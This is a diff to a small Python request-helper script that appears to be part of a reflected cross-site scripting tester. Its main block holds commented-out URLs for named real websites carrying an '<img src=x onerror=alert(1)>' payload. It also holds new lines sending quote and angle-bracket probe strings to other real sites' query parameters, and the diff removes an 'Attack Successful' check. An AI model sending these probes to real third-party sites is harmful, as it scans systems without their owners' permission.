@@ -19,6 +19,9 @@ class web_request:
         s2 = self.openurl()
         if len(s1) > len(s2): source = s1 
         else:   source = s2
+        if not source: 
+            source = requests.get(self.url)
+            source = source.text
         return source
     
     def open_request(self):
@@ -31,7 +34,9 @@ class web_request:
             pagesource = resp.text
             # print('{WebRequest} =>  \n', pagesource)
             # self.write_response_textfile(str(pagesource))
-            return pagesource
+
+            if pagesource:  return pagesource
+            else: return requests.get(self.url)
         except:
             print('\n *[Requests Failed...]* ')
             return ''
@@ -59,18 +64,14 @@ if __name__ == "__main__":
     # link = 'https://www.zentechnologies.com/search/search.php?query="><img src=x onerror="alert(1)"&search=1'
     # link = 'https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0'
     link = 'https://www.sweetwater.com/'
-
+    link = 'http://db.etree.org/shnlist.php?artist=&artist_group_key=1&year=/uvw"xyz' + "'yxz<zxy"
+    link = 'http://tw.gigacircle.com/category.html?group=abc/uvw"xyz' + "'yxz<zxy"
     Web = web_request(link, 'get')
-    resp = Web.open_request()
-    
-    urllib_resp = Web.openurl()
-    # soup = BeautifulSoup(urllib_resp, features='lxml')
-    # print(soup.find_all('form'))
-    # resp = requests.post('https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0')
+    # resp = Web.get_source()
+
+    resp = requests.get(link)
+    resp = resp.text
     print(resp)
     
-    # source = r.text
-    if( str(resp).__contains__('"><img src=x onerror="alert(1)"')):
-        print('\n\n \t Attack Successful')
     
     print('{WebRequest}')
